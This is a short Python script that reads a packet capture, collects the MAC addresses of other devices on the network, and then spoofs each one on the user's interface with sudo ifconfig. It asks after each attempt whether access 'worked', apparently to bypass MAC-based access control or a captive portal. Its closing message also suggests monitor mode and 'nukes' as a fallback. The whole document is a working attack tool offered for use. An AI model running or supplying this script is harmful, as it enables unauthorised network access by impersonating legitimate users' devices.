from subprocess import run

from scapy.all import sniff

packets = sniff(offline=input("[*] I need a packet capture from the network: "))
print(f"[+] Got {len(packets)} packets.")
packets = [pkt for pkt in packets if pkt.haslayer("Ether")]
print(f"[*] Dropped non-ethernet frames, got {len(packets)} total frames")
macs: set[str] = set()
i = 0
for pkt in packets:
    mac1: str = str(pkt['Ether'].src)
    mac2: str = str(pkt['Ether'].dst)
    if mac1 in macs and mac2 in macs:
        continue
    else:
        if mac1 in macs:
            print(f'[{i}] Got new MAC from packet destination: {mac2}')
            macs.add(mac2)
        elif mac2 in macs:
            print(f'[{i}] Got new MAC from packet source: {mac1}')
            macs.add(mac1)
        else:
            print(f'[{i}] Got two new MACs from packet source & destination: {mac1}/{mac2}')
            macs.add(mac1)
            macs.add(mac2)

    i += 1
i = -1
iface = input("[?] Interface name: ")
for mac in macs:
    _=run(['sudo', 'ifconfig', iface, 'down'],check=False)
    _=run(['sudo', 'ifconfig', iface, 'hw', 'ether', mac],check=False)
    _=run(['sudo', 'ifconfig', iface, 'up'],check=False)
    print(f"[*] Trying {mac}, did it work?")
    if "yes" in input():
        i = 1
        print("[+] 🐈 Cat pics time!")
        break
if i == -1:
    print("[-] Go capture more packets, or whip out monitor mode and some nukes.")
